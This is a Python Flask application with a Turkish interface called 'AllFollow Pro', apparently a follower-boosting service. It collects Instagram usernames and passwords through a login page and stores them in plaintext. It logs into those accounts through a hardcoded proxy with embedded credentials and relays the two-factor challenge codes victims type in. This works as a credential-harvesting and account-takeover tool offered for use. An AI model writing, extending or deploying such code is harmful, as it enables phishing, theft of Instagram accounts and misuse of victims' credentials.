import os
import threading
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import ChallengeRequired, BadPassword
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# Render DATABASE_URL kontrolü
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "allfollow-v58-fix"

db = SQLAlchemy(app)
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

active_clients = {}

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Baglaniyor")

# --- BOT İŞLEMCİSİ ---
def run_login_worker(u, p):
    # Context içinde çalışması için yeni bir app context açıyoruz
    with app.app_context():
        cl = Client()
        if PROXY_URL: cl.set_proxy(PROXY_URL)
        active_clients[u] = cl
        
        try:
            cl.login(u, p)
            set_status_db(u, "OK")
        except ChallengeRequired:
            set_status_db(u, "ONAY_LAZIM")
        except BadPassword:
            set_status_db(u, "HATALI_SIFRE")
        except Exception as e:
            set_status_db(u, f"HATA: {str(e)[:15]}")

def set_status_db(u, s):
    acc = IGAccount.query.filter_by(username=u).first()
    if acc:
        acc.status = s
        db.session.commit()

# --- ROUTES ---
@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # DB Kayıt
    acc = IGAccount.query.filter_by(username=u).first()
    if not acc:
        acc = IGAccount(username=u, password=p, status="Baglaniyor")
        db.session.add(acc)
    else:
        acc.password = p
        acc.status = "Baglaniyor"
    db.session.commit()
    
    # Botu başlat
    threading.Thread(target=run_login_worker, args=(u, p)).start()
    return jsonify(status="success")

@app.route('/api/status/<u>')
def get_status(u):
    # Veritabanından en güncel durumu çek
    acc = IGAccount.query.filter_by(username=u).first()
    if acc:
        return jsonify(status=acc.status)
    return jsonify(status="YOK")

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    u, code = data.get('u'), data.get('code')
    cl = active_clients.get(u)
    if cl:
        try:
            cl.challenge_set_code(code)
            with app.app_context(): set_status_db(u, "OK")
            return jsonify(status="success")
        except: return jsonify(status="fail")
    return jsonify(status="no_cl")

# --- ARAYÜZ ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style> .page { display: none; } .active { display: block; } </style>
</head>
<body class="bg-black text-white font-sans">

    <div id="login-p" class="page active p-10 mt-20">
        <h1 class="text-4xl font-black italic text-center mb-10">ALL FOLLOW</h1>
        <div class="space-y-4">
            <input id="u" placeholder="Kullanıcı Adı" class="w-full p-4 bg-zinc-900 rounded-2xl border border-zinc-800 outline-none">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-4 bg-zinc-900 rounded-2xl border border-zinc-800 outline-none">
            <button onclick="girisYap()" id="btn" class="w-full p-4 bg-purple-600 rounded-2xl font-bold">GİRİŞ YAP</button>
        </div>
    </div>

    <div id="main-p" class="page min-h-screen bg-white text-black p-6">
        <div class="bg-purple-600 p-8 rounded-[30px] text-white shadow-xl text-center mb-6">
            <p class="text-xs opacity-70 mb-1">BOT DURUMU</p>
            <h2 id="status-display" class="text-2xl font-black italic animate-pulse">BAĞLANIYOR...</h2>
        </div>

        <div id="verify-area" class="hidden bg-purple-50 p-6 rounded-3xl border-2 border-purple-200 text-center mb-6">
            <p class="font-bold text-purple-800 mb-4">Onay Kodu Girin:</p>
            <input id="vcode" placeholder="000000" class="w-full p-4 text-center text-2xl tracking-widest rounded-xl border mb-4">
            <button onclick="onayGönder()" class="w-full bg-purple-600 text-white py-4 rounded-xl font-bold">ONAYLA</button>
        </div>

        <div class="bg-gray-100 p-5 rounded-2xl flex justify-between items-center border">
            <p id="user-info" class="font-bold"></p>
            <div class="w-3 h-3 bg-yellow-400 rounded-full"></div>
        </div>
    </div>

    <script>
        let currUser = "";
        let timer = null;

        function girisYap() {
            currUser = document.getElementById('u').value;
            const pass = document.getElementById('p').value;
            if(!currUser || !pass) return;

            document.getElementById('btn').innerText = "İŞLENİYOR...";

            fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currUser, p: pass})
            });

            setTimeout(() => {
                document.getElementById('login-p').classList.remove('active');
                document.getElementById('main-p').classList.add('active');
                document.getElementById('user-info').innerText = currUser;
                startMonitoring();
            }, 800);
        }

        async function startMonitoring() {
            if(timer) clearInterval(timer);
            timer = setInterval(async () => {
                const res = await fetch('/api/status/' + currUser);
                const data = await res.json();
                const s = data.status;
                
                const display = document.getElementById('status-display');
                const vArea = document.getElementById('verify-area');

                if(s === "OK") {
                    display.innerText = "SİSTEM AKTİF";
                    display.classList.remove('animate-pulse');
                    display.style.color = "#22c55e"; // Yeşil
                    vArea.classList.add('hidden');
                    clearInterval(timer);
                } else if(s === "ONAY_LAZIM") {
                    display.innerText = "ONAY GEREKLİ";
                    vArea.classList.remove('hidden');
                } else if(s === "HATALI_SIFRE") {
                    display.innerText = "ŞİFRE YANLIŞ";
                    display.style.color = "#ef4444"; // Kırmızı
                    clearInterval(timer);
                } else {
                    display.innerText = "BAĞLANIYOR...";
                }
            }, 2500);
        }

        async function onayGönder() {
            const code = document.getElementById('vcode').value;
            await fetch('/api/verify', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u: currUser, code: code})
            });
            document.getElementById('vcode').value = "";
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
